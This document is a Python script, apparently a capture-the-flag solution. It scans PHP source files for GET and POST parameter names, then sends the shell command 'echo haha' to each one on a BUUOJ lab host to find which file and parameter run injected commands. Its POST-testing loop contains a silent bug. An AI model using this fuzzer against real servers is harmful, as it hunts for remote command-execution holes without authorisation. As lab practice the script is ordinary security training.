import os
import requests
import re
import time


def read_file(path, command):  # 遍历文件找出所有可用的参数
    with open(path, encoding="utf-8") as file:
        f = file.read()#读取文件内容至f
    params = {}
    pattern = re.compile("(?<=\$_GET\[').*?(?='\])")  # 正则匹配GET
    for name in pattern.findall(f):
        params[name] = command

    data = {}
    pattern = re.compile("(?<=\$_POST\[').*?(?='\])")  #正则匹配POST的参数名
    for name in pattern.findall(f):
        data[name] = command
    return params, data


def url_explosion(url, path, command):  # 确定有效的php文件
    params, data = read_file(path, command)
    try:
        r = requests.session().post(url, data=data, params=params)
        if r.text.find("haha") != -1:  #查看响应中是否有传入的参数
            print(url, "\n")
            find_params(url, params, data)

    except:
        print(url, "异常")


def find_params(url, params, data):  # 确定最终的有效参数
    try:
        for pa in params.keys():
            temp = {pa: params[pa]}
            r = requests.session().post(url, params=temp)
            if r.text.find("haha") != -1:
                print(pa)
                os.system("pause")

    except:
        print("error!\n")
    try:
        for da in data.items():
            temp = {da: data[da]}
            r = requests.session().post(url, data=temp)
            if r.text.find("haha") != -1:
                print(da)
                os.system("pause")
    except:
        print("error!\n")


rootdir = "D:\\桌面\\src\\"  # php文件存放地址
list = os.listdir(rootdir)
for i in range(0, len(list)):
    path = os.path.join(rootdir, list[i])
    name = list[i].split('-2')[0] # 获取文件名
    url = "http://c97bc3c0-ed3a-4c3c-9903-7ac844e7c5ec.node3.buuoj.cn/" + name
    url_explosion(url, path, "echo haha")




